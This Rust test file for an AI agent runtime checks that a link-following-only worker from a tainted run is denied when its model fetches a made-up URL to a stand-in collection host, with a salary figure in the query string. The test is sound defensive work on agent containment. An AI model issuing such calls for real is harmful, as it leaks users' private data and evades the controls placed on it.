//! A worker started from a tainted run follows links only: an address its
//! model made up (with private words in it) is refused, though the worker
//! itself is never private.
use super::{Change, Compartment};
use crate::admin_app::tests::server_with;
use crate::boundary::{Action, Issuer, Verdict};
use crate::events::Ev;
use crate::kernel::{new_id, NewRun};
use crate::state::Status;
use axum::Router;
use serde_json::json;
use std::time::Duration;

const POLL_EVERY: Duration = Duration::from_millis(20);
const POLLS: u32 = 500;

#[tokio::test(flavor = "multi_thread")]
async fn a_link_following_worker_opens_no_address_it_made_up() {
    let s = server_with("", |_| Router::new()).await;
    let (task, run) = (new_id("task"), new_id("run"));
    s.k.emit("kernel", Ev::Compartment(Change::Started { run: run.clone(), parent: None, compartment: Compartment::OpenWeb { link_following_only: true } })).await.unwrap();
    s.k.create_run("person:mo", "mo", "Query: pizza near me".into(), vec![], NewRun { ids: Some((task, run.clone())), ..Default::default() }).await.unwrap();
    for _ in 0..POLLS {
        if s.k.read(|st| st.runs[&run].status != Status::Running) {
            break;
        }
        tokio::time::sleep(POLL_EVERY).await;
    }
    s.k.emit("person:mo", Ev::Resumed { run: run.clone() }).await.unwrap();
    let a = Action {
        run,
        call_id: "c1".into(),
        step_id: "s9.0".into(),
        tool: "web_fetch".into(),
        input: json!({ "url": "https://collect.example/?d=salary-41k" }),
        issuer: Issuer::Model,
    };
    let v = s.k.execute(a).await.unwrap();
    let Verdict::Done { text, is_error, .. } = v else { panic!("the fetch was suspended, not refused") };
    assert!(is_error && text.contains("denied"), "a made-up address was opened: {text}");
    s.done().await;
}
